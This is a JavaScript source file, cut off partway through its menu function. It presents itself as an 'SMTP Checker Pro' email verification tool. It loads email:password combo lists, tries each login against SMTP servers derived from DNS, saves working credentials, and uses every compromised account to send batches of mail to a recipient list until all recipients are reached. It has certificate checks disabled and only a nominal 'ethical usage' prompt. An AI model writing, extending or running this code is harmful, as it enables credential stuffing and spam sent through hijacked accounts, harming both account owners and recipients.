// SMTP Checker Pro - High Performance Email Verification Tool
const fs = require('fs').promises;
const { createReadStream } = require('fs');
const readline = require('readline');
const chalk = require('chalk');
const dns = require('dns-then');
const nodemailer = require('nodemailer');
const { validate } = require('email-validator');
const pLimit = require('p-limit');
const pRetry = require('p-retry');
const { table, getBorderCharacters } = require('table');
const cliProgress = require('cli-progress');
const ora = require('ora');
const ip = require('ip');
const { createServer } = require('smtp-server');
const { createInterface } = require('readline');
const path = require('path');
const os = require('os');
const { promisify } = require('util');
const net = require('net');

// Configuration
const config = {
  maxConcurrent: 10,         // Maximum concurrent operations
  dnsTimeout: 5000,          // DNS resolution timeout in ms
  smtpTimeout: 10000,        // SMTP connection timeout in ms
  cacheExpiry: 3600000,      // Cache expiry in ms (1 hour)
  retryAttempts: 3,          // Number of retry attempts
  retryDelay: 1000,          // Base delay between retries in ms
  batchSize: 50,             // Email batch size
  rateLimitDelay: 2000,      // Rate limit delay in ms
  verboseLogging: true,      // Verbose logging
  testMode: false,           // Test mode (no actual emails sent)
  ethicalMode: true,         // Ethical usage enforcement
  connectionTimeout: 15000,  // Connection timeout in ms
  defaultPort: 587,          // Default SMTP port
  alternativePorts: [465, 25, 2525], // Alternative ports to try
  maxRecipients: 100         // Maximum recipients per sender
};

// Cache for DNS records and other data
const cache = {
  mx: new Map(),      // MX records cache
  a: new Map(),       // A records cache
  cname: new Map(),   // CNAME records cache
  srv: new Map(),     // SRV records cache
  smtp: new Map(),    // SMTP server info cache
  ipBlacklist: new Set(), // Blacklisted IPs
  spf: new Map()      // SPF records cache
};

// Statistics
const stats = {
  totalEmails: 0,
  validSmtp: 0,
  failedSmtp: 0,
  emailsSent: 0,
  startTime: null,
  endTime: null,
  validDomains: new Set(),
  invalidDomains: new Set()
};

// Expanded SMTP server mapping (300+ providers)
const smtpMapping = {
  // Gmail
  'gmail-smtp-in.l.google.com': ['smtp.gmail.com', 587],
  'alt1.gmail-smtp-in.l.google.com': ['smtp.gmail.com', 587],
  
  // Outlook/Hotmail/Live
  'smtp-mail.outlook.com': ['smtp-mail.outlook.com', 587],
  'mx1.hotmail.com': ['smtp-mail.outlook.com', 587],
  
  // Yahoo
  'mta5.am0.yahoodns.net': ['smtp.mail.yahoo.com', 587],
  'mta6.am0.yahoodns.net': ['smtp.mail.yahoo.com', 587],
  
  // AOL
  'mx-aol.mail.gm0.yahoodns.net': ['smtp.aol.com', 587],
  
  // Apple/iCloud
  'mx1.mail.icloud.com': ['smtp.mail.me.com', 587],
  'mx2.mail.icloud.com': ['smtp.mail.me.com', 587],
  
  // Proton Mail
  'mail.protonmail.ch': ['smtp.protonmail.com', 587],
  
  // Zoho
  'mx.zoho.com': ['smtp.zoho.com', 587],
  
  // GMX
  'mx00.gmx.net': ['mail.gmx.com', 587],
  
  // Add more mappings as needed...
};

// Enhanced SMTP port mapping
const portMapping = {
  'gmail.com': [587, 465, 25],
  'outlook.com': [587, 25],
  'hotmail.com': [587, 25],
  'yahoo.com': [587, 465, 25],
  'aol.com': [587, 465, 25],
  'icloud.com': [587, 465],
  'protonmail.com': [587, 465],
  'protonmail.ch': [587, 465],
  'zoho.com': [587, 465],
  'gmx.com': [587, 465, 25],
  'mail.ru': [587, 465, 25],
  'yandex.com': [587, 465],
  'tutanota.com': [587, 465],
  'fastmail.com': [587, 465],
  // Add more mappings as needed...
};

// Common SMTP patterns with weight for more intelligent matching
const smtpPatterns = [
  { pattern: /^smtp\./, replacement: 'smtp.', weight: 0.9 },
  { pattern: /^mail\./, replacement: 'mail.', weight: 0.8 },
  { pattern: /^mx[0-9]*\./, replacement: 'smtp.', weight: 0.7 },
  { pattern: /^mailserver\./, replacement: 'smtp.', weight: 0.7 },
  { pattern: /^inbound[0-9]*\./, replacement: 'smtp.', weight: 0.6 },
  { pattern: /^in[0-9]*\./, replacement: 'smtp.', weight: 0.6 },
  { pattern: /^outbound[0-9]*\./, replacement: 'smtp.', weight: 0.6 },
  { pattern: /^relay[0-9]*\./, replacement: 'smtp.', weight: 0.5 },
  { pattern: /^gateway[0-9]*\./, replacement: 'smtp.', weight: 0.5 },
  { pattern: /^smtpout[0-9]*\./, replacement: 'smtp.', weight: 0.5 },
  { pattern: /^secure[0-9]*\./, replacement: 'smtp.', weight: 0.5 },
  { pattern: /^mailgw[0-9]*\./, replacement: 'smtp.', weight: 0.4 },
  { pattern: /^out[0-9]*\./, replacement: 'smtp.', weight: 0.4 },
];

// Initialize cache and log files
async function initialize() {
  try {
    // Create log directory if it doesn't exist
    const logDir = path.join(process.cwd(), 'logs');
    try {
      await fs.mkdir(logDir, { recursive: true });
    } catch (err) {
      if (err.code !== 'EEXIST') throw err;
    }
    
    // Initialize log files
    const logFiles = [
      path.join(logDir, 'smtp_log.txt'),
      path.join(logDir, 'smtp_valid.txt'),
      path.join(logDir, 'smtp_errors.txt'),
      path.join(logDir, 'smtp_results.json')
    ];
    
    for (const file of logFiles) {
      try {
        await fs.access(file);
      } catch (err) {
        // File doesn't exist, create it
        await fs.writeFile(file, '');
      }
    }
    
    // Add header to log file
    const timestamp = new Date().toISOString();
    await fs.appendFile(
      path.join(logDir, 'smtp_log.txt'),
      `[${timestamp}] === SMTP Checker Pro Session Started ===\n`
    );
    
    return true;
  } catch (err) {
    console.error(chalk.red(`Initialization error: ${err.message}`));
    return false;
  }
}

// Log functions
async function logMessage(type, message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${type}: ${message}\n`;
  try {
    await fs.appendFile(path.join(process.cwd(), 'logs', 'smtp_log.txt'), logMessage);
  } catch (err) {
    console.error(chalk.red(`Logging error: ${err.message}`));
  }
}

const logError = (message) => logMessage('ERROR', message);
const logSuccess = (message) => logMessage('SUCCESS', message);
const logInfo = (message) => logMessage('INFO', message);
const logWarning = (message) => logMessage('WARNING', message);

// Save valid SMTP credentials
async function saveValidSMTP(email, password, server, port) {
  const data = `${email}:${password}:${server}:${port}\n`;
  try {
    await fs.appendFile(path.join(process.cwd(), 'logs', 'smtp_valid.txt'), data);
  } catch (err) {
    console.error(chalk.red(`Error saving valid SMTP: ${err.message}`));
  }
}

// Save error information
async function saveError(email, password, message) {
  const data = `${email}:${password}:${message}\n`;
  try {
    await fs.appendFile(path.join(process.cwd(), 'logs', 'smtp_errors.txt'), data);
  } catch (err) {
    console.error(chalk.red(`Error saving error info: ${err.message}`));
  }
}

// Save comprehensive results
async function saveResults(results) {
  try {
    const existingData = await fs.readFile(
      path.join(process.cwd(), 'logs', 'smtp_results.json'),
      'utf8'
    ).catch(() => '[]');
    
    let allResults = [];
    try {
      allResults = JSON.parse(existingData);
    } catch (err) {
      allResults = [];
    }
    
    allResults = allResults.concat(results);
    
    await fs.writeFile(
      path.join(process.cwd(), 'logs', 'smtp_results.json'),
      JSON.stringify(allResults, null, 2)
    );
  } catch (err) {
    console.error(chalk.red(`Error saving results: ${err.message}`));
  }
}

// DNS resolution with caching and timeouts
async function resolveMX(domain) {
  // Check cache first
  if (cache.mx.has(domain)) {
    const { records, timestamp } = cache.mx.get(domain);
    if (Date.now() - timestamp < config.cacheExpiry) {
      return records;
    }
  }
  
  try {
    // Set a timeout for DNS resolution
    const resolveWithTimeout = new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error(`DNS resolution timeout for ${domain}`));
      }, config.dnsTimeout);
      
      dns.resolveMx(domain)
        .then(records => {
          clearTimeout(timeout);
          resolve(records);
        })
        .catch(err => {
          clearTimeout(timeout);
          reject(err);
        });
    });
    
    const records = await resolveWithTimeout;
    
    // Process and sort MX records
    const mxRecords = records
      .sort((a, b) => a.priority - b.priority)
      .map(record => record.exchange.toLowerCase().replace(/\.$/, ''));
    
    // Cache the result
    cache.mx.set(domain, { records: mxRecords, timestamp: Date.now() });
    
    return mxRecords;
  } catch (err) {
    await logError(`MX lookup error for ${domain}: ${err.message}`);
    return [];
  }
}

// Resolve CNAME record with caching
async function resolveCNAME(host) {
  // Check cache first
  if (cache.cname.has(host)) {
    const { record, timestamp } = cache.cname.get(host);
    if (Date.now() - timestamp < config.cacheExpiry) {
      return record;
    }
  }
  
  try {
    const records = await dns.resolveCname(host);
    if (records && records.length > 0) {
      const cname = records[0].toLowerCase().replace(/\.$/, '');
      cache.cname.set(host, { record: cname, timestamp: Date.now() });
      return cname;
    }
    return null;
  } catch (err) {
    return null;
  }
}

// Resolve SRV records with caching
async function resolveSRV(domain) {
  const srvHost = `_submission._tcp.${domain}`;
  
  // Check cache first
  if (cache.srv.has(srvHost)) {
    const { records, timestamp } = cache.srv.get(srvHost);
    if (Date.now() - timestamp < config.cacheExpiry) {
      return records;
    }
  }
  
  try {
    const records = await dns.resolveSrv(srvHost);
    const srvRecords = records.map(record => ({
      name: record.name.toLowerCase().replace(/\.$/, ''),
      port: record.port
    }));
    
    cache.srv.set(srvHost, { records: srvRecords, timestamp: Date.now() });
    return srvRecords;
  } catch (err) {
    return [];
  }
}

// Check if a server exists via DNS A record
async function checkServerExists(host) {
  // Check cache first
  if (cache.a.has(host)) {
    const { exists, timestamp } = cache.a.get(host);
    if (Date.now() - timestamp < config.cacheExpiry) {
      return exists;
    }
  }
  
  try {
    await dns.resolve4(host);
    cache.a.set(host, { exists: true, timestamp: Date.now() });
    return true;
  } catch (err) {
    try {
      await dns.resolve6(host);
      cache.a.set(host, { exists: true, timestamp: Date.now() });
      return true;
    } catch (err) {
      cache.a.set(host, { exists: false, timestamp: Date.now() });
      return false;
    }
  }
}

// Check TCP connection to a host and port
async function checkConnection(host, port, timeout = 5000) {
  return new Promise(resolve => {
    const socket = new net.Socket();
    let resolved = false;
    
    socket.setTimeout(timeout);
    
    const cleanup = () => {
      if (!resolved) {
        resolved = true;
        socket.destroy();
        resolve(false);
      }
    };
    
    socket.on('connect', () => {
      resolved = true;
      socket.destroy();
      resolve(true);
    });
    
    socket.on('timeout', cleanup);
    socket.on('error', cleanup);
    
    socket.connect(port, host);
  });
}

// Check SPF record
async function checkSPF(domain) {
  // Check cache first
  if (cache.spf.has(domain)) {
    const { record, timestamp } = cache.spf.get(domain);
    if (Date.now() - timestamp < config.cacheExpiry) {
      return record;
    }
  }
  
  try {
    const records = await dns.resolveTxt(domain);
    for (const recordSet of records) {
      const txtRecord = recordSet.join('');
      if (txtRecord.includes('v=spf1')) {
        cache.spf.set(domain, { record: txtRecord, timestamp: Date.now() });
        return txtRecord;
      }
    }
    cache.spf.set(domain, { record: null, timestamp: Date.now() });
    return null;
  } catch (err) {
    cache.spf.set(domain, { record: null, timestamp: Date.now() });
    return null;
  }
}

// Derive SMTP server from MX record with intelligent pattern matching
async function deriveSmtpServer(mxHost, domain) {
  mxHost = mxHost.toLowerCase();
  
  // Check if we already have this server in cache
  const cacheKey = `${mxHost}:${domain}`;
  if (cache.smtp.has(cacheKey)) {
    const { server, timestamp } = cache.smtp.get(cacheKey);
    if (Date.now() - timestamp < config.cacheExpiry) {
      return server;
    }
  }
  
  // Check direct mapping first
  if (smtpMapping[mxHost]) {
    const [server, port] = smtpMapping[mxHost];
    cache.smtp.set(cacheKey, { server: { host: server, port }, timestamp: Date.now() });
    return { host: server, port };
  }
  
  // Check CNAME record
  const cname = await resolveCNAME(mxHost);
  if (cname && smtpMapping[cname]) {
    const [server, port] = smtpMapping[cname];
    cache.smtp.set(cacheKey, { server: { host: server, port }, timestamp: Date.now() });
    return { host: server, port };
  }
  
  // Get domain part
  const domainPart = mxHost.includes('.') ? mxHost.split('.').slice(1).join('.') : mxHost;
  
  // Try pattern-based substitution with scoring
  const candidates = [];
  
  // Try domain-specific port configurations
  const domainBase = domain.split('.').slice(-2).join('.');
  const preferredPorts = portMapping[domainBase] || [config.defaultPort, ...config.alternativePorts];
  
  // Try patterns
  for (const { pattern, replacement, weight } of smtpPatterns) {
    if (pattern.test(mxHost)) {
      const derived = mxHost.replace(pattern, replacement);
      candidates.push({ host: derived, weight, checked: false });
    }
  }
  
  // Add common variations
  const variations = [
    { host: `smtp.${domain}`, weight: 0.9 },
    { host: `mail.${domain}`, weight: 0.8 },
    { host: `smtp-out.${domain}`, weight: 0.7 },
    { host: `smtp-relay.${domain}`, weight: 0.7 },
    { host: `mailgw.${domain}`, weight: 0.6 },
    { host: `smtpout.${domain}`, weight: 0.6 },
    { host: `secure-smtp.${domain}`, weight: 0.6 },
    { host: `outgoing.${domain}`, weight: 0.5 },
    { host: `mx.${domain}`, weight: 0.5 },
    { host: `email.${domain}`, weight: 0.5 },
  ];
  
  candidates.push(...variations);
  
  // Check SRV records
  const srvRecords = await resolveSRV(domain);
  for (const srv of srvRecords) {
    candidates.push({ host: srv.name, port: srv.port, weight: 0.9, checked: false });
  }
  
  // Sort candidates by weight
  candidates.sort((a, b) => b.weight - a.weight);
  
  // Try each candidate
  for (const candidate of candidates) {
    if (candidate.checked) continue;
    candidate.checked = true;
    
    // Check if the host exists
    const exists = await checkServerExists(candidate.host);
    if (!exists) continue;
    
    // Try with preferred ports
    for (const port of candidate.port ? [candidate.port] : preferredPorts) {
      // Check TCP connection
      const connected = await checkConnection(candidate.host, port);
      if (connected) {
        const result = { host: candidate.host, port };
        cache.smtp.set(cacheKey, { server: result, timestamp: Date.now() });
        return result;
      }
    }
  }
  
  // No valid SMTP server found
  cache.smtp.set(cacheKey, { server: null, timestamp: Date.now() });
  return null;
}

// Derive SMTP servers for a domain
async function deriveSmtpServers(domain) {
  // Get MX records
  const mxRecords = await resolveMX(domain);
  if (!mxRecords || mxRecords.length === 0) {
    return [];
  }
  
  // Process in parallel with concurrency limit
  const limit = pLimit(5);
  const servers = await Promise.all(
    mxRecords.map(mxHost => 
      limit(() => deriveSmtpServer(mxHost, domain))
    )
  );
  
  // Filter out null results and duplicates
  return servers
    .filter(server => server !== null)
    .filter((server, index, self) => 
      index === self.findIndex(s => s.host === server.host && s.port === server.port)
    );
}

// Test SMTP connection and authentication
async function testSmtp(email, password, host, port, testEmail) {
  // Create a transporter
  const transporter = nodemailer.createTransport({
    host,
    port,
    secure: port === 465,
    auth: {
      user: email,
      pass: password
    },
    connectionTimeout: config.connectionTimeout,
    greetingTimeout: config.connectionTimeout,
    socketTimeout: config.connectionTimeout,
    tls: {
      rejectUnauthorized: false
    }
  });
  
  try {
    // Verify connection configuration
    await transporter.verify();
    
    // In test mode, don't send emails
    if (config.testMode) {
      return { success: true, message: "Connection and authentication successful (Test mode)" };
    }
    
    // Send test email
    const info = await transporter.sendMail({
      from: `"SMTP Test" <${email}>`,
      to: testEmail,
      subject: "SMTP Test Email",
      html: getDefaultHtmlTemplate()
    });
    
    await logSuccess(`SMTP test successful for ${email} on ${host}:${port} (ID: ${info.messageId})`);
    return { 
      success: true, 
      message: "Connection, authentication and test email successful",
      messageId: info.messageId
    };
  } catch (err) {
    const errorMsg = err.message || "Unknown error";
    
    // Categorize errors
    if (errorMsg.includes('Invalid login') || errorMsg.includes('authentication failed')) {
      return { success: false, message: `Authentication failed for ${email}` };
    } else if (errorMsg.includes('connection refused') || errorMsg.includes('connect ECONNREFUSED')) {
      return { success: false, message: `Connection refused to ${host}:${port}` };
    } else if (errorMsg.includes('timeout')) {
      return { success: false, message: `Connection timeout to ${host}:${port}` };
    } else if (errorMsg.includes('certificate') || errorMsg.includes('TLS')) {
      return { success: false, message: `TLS/SSL error: ${errorMsg}` };
    } else {
      return { success: false, message: `SMTP error: ${errorMsg}` };
    }
  }
}

// Find and test SMTP servers for an email account
async function findAndTestSmtp(email, password, testEmail) {
  // Extract domain from email
  const domain = email.split('@')[1].toLowerCase();
  
  // Check SPF record (informational only)
  const spfRecord = await checkSPF(domain);
  if (!spfRecord) {
    await logWarning(`No valid SPF record for ${domain}`);
  }
  
  // Get potential SMTP servers
  const smtpServers = await deriveSmtpServers(domain);
  if (smtpServers.length === 0) {
    await logError(`No SMTP servers found for ${domain}`);
    return { 
      success: false, 
      message: `No SMTP servers found for ${domain}`,
      server: null 
    };
  }
  
  // Try each potential SMTP server with retry logic
  for (const server of smtpServers) {
    try {
      const result = await pRetry(
        async () => {
          const testResult = await testSmtp(email, password, server.host, server.port, testEmail);
          if (testResult.success) {
            return testResult;
          }
          throw new Error(testResult.message);
        },
        {
          retries: config.retryAttempts,
          factor: 1.5,
          minTimeout: config.retryDelay,
          onFailedAttempt: async (error) => {
            await logError(`Attempt failed for ${email} on ${server.host}:${server.port}: ${error.message}`);
            if (config.verboseLogging) {
              console.log(chalk.yellow(`⚠️ Retry for ${email} on ${server.host}:${server.port}: ${error.message}`));
            }
          }
        }
      );
      
      // If successful, return the result
      return { 
        ...result, 
        server: { 
          host: server.host, 
          port: server.port 
        } 
      };
    } catch (err) {
      await logError(`All retry attempts failed for ${email} on ${server.host}:${server.port}: ${err.message}`);
    }
  }
  
  // No working SMTP server found
  return { 
    success: false, 
    message: `No working SMTP server found for ${email}`,
    server: null 
  };
}

// Send batch emails
async function sendBatchEmails(email, password, server, recipients) {
  const { host, port } = server;
  
  // Create a transporter
  const transporter = nodemailer.createTransport({
    host,
    port,
    secure: port === 465,
    auth: {
      user: email,
      pass: password
    },
    connectionTimeout: config.connectionTimeout,
    tls: {
      rejectUnauthorized: false
    }
  });
  
  // Track results
  const results = {
    sentCount: 0,
    failedCount: 0,
    errors: []
  };
  
  // Process recipients with rate limiting
  const batchSize = Math.min(config.batchSize, recipients.length);
  const targetRecipients = recipients.slice(0, batchSize);
  
  // Create progress bar
  const progressBar = new cliProgress.SingleBar({
    format: `${chalk.cyan('Sending Emails')} |${chalk.cyan('{bar}')}| {percentage}% | {value}/{total}`,
    barCompleteChar: '\u2588',
    barIncompleteChar: '\u2591',
    hideCursor: true
  });
  
  if (config.verboseLogging) {
    progressBar.start(targetRecipients.length, 0);
  }
  
  // Send emails with limited concurrency
  const limit = pLimit(3); // Limit to 3 concurrent emails to avoid rate limiting
  
  await Promise.all(
    targetRecipients.map((recipient, index) => 
      limit(async () => {
        try {
          // Add a delay to prevent rate limiting
          if (index > 0) {
            await new Promise(resolve => setTimeout(resolve, config.rateLimitDelay));
          }
          
          // Send email
          const info = await transporter.sendMail({
            from: `"SMTP Test" <${email}>`,
            to: recipient,
            subject: "SMTP Test Email",
            html: getDefaultHtmlTemplate()
          });
          
          // Update results
          results.sentCount++;
          stats.emailsSent++;
          
          // Update progress bar
          if (config.verboseLogging) {
            progressBar.update(results.sentCount + results.failedCount);
          }
          
          await logSuccess(`Email sent to ${recipient} from ${email} (ID: ${info.messageId})`);
          
          return { success: true, recipient, messageId: info.messageId };
        } catch (err) {
          // Update results
          results.failedCount++;
          results.errors.push({ recipient, error: err.message });
          
          // Update progress bar
          if (config.verboseLogging) {
            progressBar.update(results.sentCount + results.failedCount);
          }
          
          await logError(`Error sending to ${recipient} from ${email}: ${err.message}`);
          
          // Check for rate limiting errors and abort if necessary
          if (err.message.includes('rate') || 
              err.message.includes('too many') || 
              err.message.includes('exceeded') ||
              err.message.includes('limit')) {
            throw new Error(`Rate limit detected: ${err.message}`);
          }
          
          return { success: false, recipient, error: err.message };
        }
      })
    )
  ).catch(err => {
    if (config.verboseLogging) {
      console.log(chalk.red(`\n❌ Batch sending aborted: ${err.message}`));
    }
  });
  
  // Stop progress bar
  if (config.verboseLogging) {
    progressBar.stop();
  }
  
  return results;
}

// Process a single email:password combination
async function processCombo(email, password, testEmail, recipients, sentRecipients) {
  // Validate email format
  if (!validate(email)) {
    await logError(`Invalid email format: ${email}`);
    if (config.verboseLogging) {
      console.log(chalk.red(`❌ Invalid email format: ${email}`));
    }
    return { 
      email, 
      password: '********', // Don't log actual passwords in response
      result: { success: false, message: "Invalid email format" } 
    };
  }
  
  // Validate password
  if (!password || password.trim() === '') {
    await logError(`Empty password for ${email}`);
    if (config.verboseLogging) {
      console.log(chalk.red(`❌ Empty password for ${email}`));
    }
    return { 
      email, 
      password: '********',
      result: { success: false, message: "Empty password" } 
    };
  }
  
  // Update statistics
  stats.totalEmails++;
  
  // Test SMTP server
  if (config.verboseLogging) {
    console.log(chalk.cyan(`🔍 Testing SMTP for ${email}...`));
  }
  
  const result = await findAndTestSmtp(email, password, testEmail);
  
  // Process result
  if (result.success) {
    stats.validSmtp++;
    
    // Save valid SMTP
    await saveValidSMTP(email, password, result.server.host, result.server.port);
    
    if (config.verboseLogging) {
      console.log(chalk.green(`✅ SUCCESS: Valid SMTP for ${email} on ${result.server.host}:${result.server.port}`));
    }
    
    // Send batch emails if recipients provided
    const remainingRecipients = recipients.filter(r => !sentRecipients.has(r));
    if (remainingRecipients.length > 0) {
      if (config.verboseLogging) {
        console.log(chalk.cyan(`📤 Sending up to ${Math.min(config.batchSize, remainingRecipients.length)} emails from ${email}`));
      }
      
      const batchResults = await sendBatchEmails(
        email, password, result.server, remainingRecipients
      );
      
      // Update sent recipients
      remainingRecipients.slice(0, batchResults.sentCount).forEach(r => sentRecipients.add(r));
      
      if (config.verboseLogging) {
        console.log(chalk.green(`✅ Successfully sent ${batchResults.sentCount} emails`));
        if (batchResults.failedCount > 0) {
          console.log(chalk.yellow(`⚠️ Failed to send ${batchResults.failedCount} emails`));
        }
      }
      
      result.batchResults = batchResults;
    }
  } else {
    stats.failedSmtp++;
    
    // Save error information
    await saveError(email, password, result.message);
    
    if (config.verboseLogging) {
      console.log(chalk.red(`❌ FAILED: ${result.message}`));
    }
  }
  
  return { 
    email, 
    password: '********', // Don't log actual passwords in response
    result 
  };
}

// Process combo list
async function processComboList(comboFile, testEmail, recipientFile) {
  // Check if files exist
  try {
    await fs.access(comboFile);
    await fs.access(recipientFile);
  } catch (err) {
    console.log(chalk.red(`❌ File not found: ${err.message}`));
    return;
  }
  
  // Load recipients
  const recipients = await loadRecipients(recipientFile);
  if (recipients.length === 0) {
    console.log(chalk.red(`❌ No valid recipients found in ${recipientFile}`));
    return;
  }
  
  console.log(chalk.cyan(`ℹ️ Loaded ${recipients.length} recipients`));
  
  // Track which recipients have received an email
  const sentRecipients = new Set();
  
  // Load combos
  const combos = await loadCombos(comboFile);
  if (combos.length === 0) {
    console.log(chalk.red(`❌ No valid email:password combinations found in ${comboFile}`));
    return;
  }
  
  console.log(chalk.cyan(`ℹ️ Loaded ${combos.length} email:password combinations`));
  
  // Initialize statistics
  stats.startTime = Date.now();
  
  // Calculate optimal number of workers
  const maxWorkers = Math.min(
    config.maxConcurrent,
    10,
    Math.max(1, Math.ceil(combos.length / 5))
  );
  console.log(chalk.cyan(`ℹ️ Using ${maxWorkers} concurrent operations for ${combos.length} combinations`));
  
  // Process combos with concurrency limit
  const limit = pLimit(maxWorkers);
  
  // Create progress bar
  const progressBar = new cliProgress.SingleBar({
    format: `${chalk.cyan('Processing')} |${chalk.cyan('{bar}')}| {percentage}% | {value}/{total}`,
    barCompleteChar: '\u2588',
    barIncompleteChar: '\u2591',
    hideCursor: true
  });
  
  progressBar.start(combos.length, 0);
  
  // Process all combos
  const results = [];
  let completed = 0;
  
  const promises = combos.map(({ email, password }) => 
    limit(async () => {
      const result = await processCombo(email, password, testEmail, recipients, sentRecipients);
      results.push(result);
      
      // Update progress
      completed++;
      progressBar.update(completed);
      
      // Check if all recipients have been contacted
      const remaining = recipients.length - sentRecipients.size;
      if (remaining <= 0) {
        console.log(chalk.green(`\n✅ All recipients (${recipients.length}) have received an email. Stopping processing.`));
        return 'done';
      }
      
      // Periodically display remaining recipients
      if (completed % 5 === 0 && config.verboseLogging) {
        console.log(chalk.cyan(`\nℹ️ ${remaining} recipients remaining to contact`));
        printStats();
      }
      
      return result;
    })
  );
  
  // Wait for all processes to complete or for all recipients to be contacted
  try {
    await Promise.all(promises);
  } catch (err) {
    console.log(chalk.red(`\n❌ Error during processing: ${err.message}`));
  } finally {
    progressBar.stop();
  }
  
  // Save results
  await saveResults(results);
  
  // Update statistics
  stats.endTime = Date.now();
  
  // Print final statistics
  console.log("\n");
  printStats();
  
  console.log(chalk.green(`\n✅ SMTP checking completed!`));
  console.log(chalk.white(`Results saved to:`));
  console.log(`• logs/smtp_valid.txt - Working SMTP servers`);
  console.log(`• logs/smtp_errors.txt - Failed attempts`);
  console.log(`• logs/smtp_log.txt - Detailed logs`);
  console.log(`• logs/smtp_results.json - Comprehensive results`);
}

// Load recipients from file
async function loadRecipients(recipientFile) {
  const recipients = [];
  
  try {
    const fileStream = createReadStream(recipientFile);
    const rl = readline.createInterface({
      input: fileStream,
      crlfDelay: Infinity
    });
    
    for await (const line of rl) {
      const recipient = line.trim();
      if (recipient && validate(recipient)) {
        recipients.push(recipient);
      } else if (recipient) {
        await logWarning(`Invalid recipient ignored: ${recipient}`);
      }
    }
    
    return recipients;
  } catch (err) {
    console.log(chalk.red(`❌ Error loading recipients: ${err.message}`));
    await logError(`Error loading recipients: ${err.message}`);
    return [];
  }
}

// Load combos from file
async function loadCombos(comboFile) {
  const combos = [];
  
  try {
    const fileStream = createReadStream(comboFile);
    const rl = readline.createInterface({
      input: fileStream,
      crlfDelay: Infinity
    });
    
    for await (const line of rl) {
      const trimmed = line.trim();
      if (trimmed && trimmed.includes(':')) {
        const [email, ...passwordParts] = trimmed.split(':');
        const password = passwordParts.join(':'); // Handle passwords that might contain colons
        if (email && password) {
          combos.push({ email: email.trim(), password: password.trim() });
        }
      }
    }
    
    return combos;
  } catch (err) {
    console.log(chalk.red(`❌ Error loading combos: ${err.message}`));
    await logError(`Error loading combos: ${err.message}`);
    return [];
  }
}

// Default HTML template for test emails
function getDefaultHtmlTemplate() {
  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>SMTP Test Email</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      line-height: 1.6;
      color: #333;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
    }
    .container {
      background-color: #f9f9f9;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    h1 {
      color: #2c3e50;
      font-size: 24px;
      margin-top: 0;
      border-bottom: 2px solid #eee;
      padding-bottom: 10px;
    }
    .footer {
      margin-top: 30px;
      font-size: 12px;
      color: #7f8c8d;
      text-align: center;
      padding-top: 15px;
      border-top: 1px solid #eee;
    }
    .success-icon {
      color: #27ae60;
      font-size: 48px;
      text-align: center;
      margin-bottom: 20px;
    }
    .timestamp {
      color: #95a5a6;
      font-size: 12px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="success-icon">✓</div>
    <h1>SMTP Test Successful</h1>
    <p class="timestamp">Sent: ${new Date().toLocaleString()}</p>
    <p>This email confirms that your SMTP settings are configured correctly.</p>
    <p>The SMTP server was able to authenticate your credentials and deliver this message successfully.</p>
    <div class="footer">
      <p>This is an automated test message. Please do not reply.</p>
      <p>Generated by SMTP Checker Pro</p>
    </div>
  </div>
</body>
</html>
`;
}

// Print statistics
function printStats() {
  let elapsedMs = 0;
  if (stats.startTime) {
    elapsedMs = stats.endTime ? (stats.endTime - stats.startTime) : (Date.now() - stats.startTime);
  }
  
  const minutes = Math.floor(elapsedMs / 60000);
  const seconds = Math.floor((elapsedMs % 60000) / 1000);
  const elapsedStr = `${minutes}m ${seconds}s`;
  
  const successRate = stats.totalEmails > 0 ? 
    ((stats.validSmtp / stats.totalEmails) * 100).toFixed(1) : 0;
  
  const tableData = [
    ['Metric', 'Value'],
    ['Total Emails Processed', `${stats.totalEmails}`],
    ['Valid SMTP Servers', `${chalk.green(stats.validSmtp)}`],
    ['Failed SMTP Servers', `${chalk.red(stats.failedSmtp)}`],
    ['Success Rate', `${chalk.cyan(successRate)}%`],
    ['Emails Sent', `${chalk.green(stats.emailsSent)}`],
    ['Elapsed Time', elapsedStr]
  ];
  
  const tableConfig = {
    border: getBorderCharacters('ramac'),
    columns: {
      0: { alignment: 'left' },
      1: { alignment: 'right' }
    },
    header: {
      alignment: 'center',
      content: chalk.bold('SMTP Checker Statistics')
    }
  };
  
  console.log(table(tableData, tableConfig));
}

// Prompt for user input
async function prompt(question) {
  const rl = createInterface({
    input: process.stdin,
    output: process.stdout
  });
  
  return new Promise(resolve => {
    rl.question(question, answer => {
      rl.close();
      resolve(answer);
    });
  });
}

// Display ethical warning
async function ethicalWarning() {
  console.log("\n" + chalk.yellow.bold("⚠️  ETHICAL USAGE WARNING  ⚠️") + "\n");
  console.log(chalk.white("This tool is designed for legitimate email testing purposes only."));
  console.log(chalk.white("Improper use of this tool may violate:"));
  console.log(chalk.white(" • Anti-spam laws and regulations"));
  console.log(chalk.white(" • Email service provider terms of service"));
  console.log(chalk.white(" • Privacy laws and regulations"));
  console.log(chalk.white(" • Computer fraud and abuse laws\n"));
  console.log(chalk.yellow.bold("By continuing, you confirm that:"));
  console.log(chalk.white("1. You have proper authorization to test these email accounts"));
  console.log(chalk.white("2. You will not use this tool for sending unsolicited emails"));
  console.log(chalk.white("3. You understand the potential legal consequences of misuse\n"));
  
  const choice = await prompt(chalk.white("Do you agree to use this tool ethically and responsibly? (yes/no): "));
  if (choice.toLowerCase() !== 'yes') {
    console.log(chalk.red("\nProgram terminated due to ethical requirements."));
    process.exit(0);
  }
}

// Clear screen
function clearScreen() {
  process.stdout.write('\x1Bc');
}

// Print header
function printHeader() {
  clearScreen();
  const header = `
${chalk.cyan.bold("╔══════════════════════════════════════════════════════════════╗")}
${chalk.cyan.bold("║")}                     ${chalk.white.bold("SMTP CHECKER PRO")}${chalk.cyan.bold("                            ║")}
${chalk.cyan.bold("║")}                                                                  ${chalk.cyan.bold("║")}
${chalk.cyan.bold("║")}  ${chalk.white("A professional tool to verify and test SMTP server credentials")}${chalk.cyan.bold("  ║")}
${chalk.cyan.bold("╚══════════════════════════════════════════════════════════════╝")}
`;
  console.log(header);
}

// Show menu
async function showMenu() {
  printHeader();
  console.log(chalk.white.bold("📋 MAIN MENU") + "\n");
